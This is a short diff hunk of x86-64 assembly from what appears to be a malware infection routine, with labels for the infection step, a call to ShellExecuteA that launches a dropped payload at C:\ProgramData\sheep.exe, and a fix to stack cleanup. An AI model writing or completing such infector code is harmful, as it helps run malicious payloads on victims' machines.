@@ -81,7 +81,7 @@ infection__payload_exists:
    call rdi                     ; ShellExecuteA(nullptr, nullptr, "C:\\ProgramData\\sheep.exe", nullptr, nullptr, 1)
    
 infection__end:
-   add rsp,0x48
+   add rsp,0x28
    mov rsi,[rsp+0x18]
    mov rdi,[rsp+0x10]
    mov rbp,[rsp+8]
